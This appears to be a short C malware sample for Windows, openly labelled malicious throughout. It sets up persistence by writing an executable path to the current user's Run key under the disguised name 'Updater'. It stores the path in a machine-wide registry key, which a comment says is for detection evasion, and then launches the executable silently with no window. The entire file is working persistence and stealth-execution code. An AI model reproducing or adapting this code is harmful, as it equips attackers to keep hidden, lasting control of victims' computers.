#include <windows.h>
#include <stdio.h>
#include <string.h>

#define MALWARE_EXE_PATH L"C:\\Users\\bash\\Desktop\\test.exe"
#define RUN_KEY_PATH L"Software\\Microsoft\\Windows\\CurrentVersion\\Run"
#define RUN_VALUE_NAME L"Updater"

void malicious_persistence()
{
    HKEY hKey;
    LONG status;

    // Set malware executable path into HKCU Run key to auto-launch on startup
    status = RegOpenKeyExW(HKEY_CURRENT_USER, RUN_KEY_PATH, 0, KEY_SET_VALUE, &hKey);
    if (status == ERROR_SUCCESS) {
        RegSetValueExW(hKey, RUN_VALUE_NAME, 0, REG_SZ, (const BYTE*)MALWARE_EXE_PATH,
                       (wcslen(MALWARE_EXE_PATH) + 1) * sizeof(wchar_t));
        RegCloseKey(hKey);
    }

    // Also save the malware path to a custom key for fallback/detection evasion
    status = RegCreateKeyW(HKEY_LOCAL_MACHINE,
                          L"Software\\Microsoft\\MyApp\\Settings", &hKey);
    if (status == ERROR_SUCCESS) {
        RegSetValueExW(hKey, L"ExePath", 0, REG_SZ, (const BYTE*)MALWARE_EXE_PATH,
                       (wcslen(MALWARE_EXE_PATH) + 1) * sizeof(wchar_t));
        RegCloseKey(hKey);
    }

    // Silently change current directory to temp folder (possibly attacker-controlled)
    SetCurrentDirectoryW(L"C:\\Windows\\Temp");
}

int main()
{
    // Trigger malicious persistence actions
    malicious_persistence();

    // Payload: silently execute malware
    // This requires CreateProcess, simplified example here:
    STARTUPINFO si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(si);
    if (CreateProcessW(MALWARE_EXE_PATH, NULL, NULL, NULL, FALSE, CREATE_NO_WINDOW,
                       NULL, NULL, &si, &pi)) {
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }

    return 0;
}
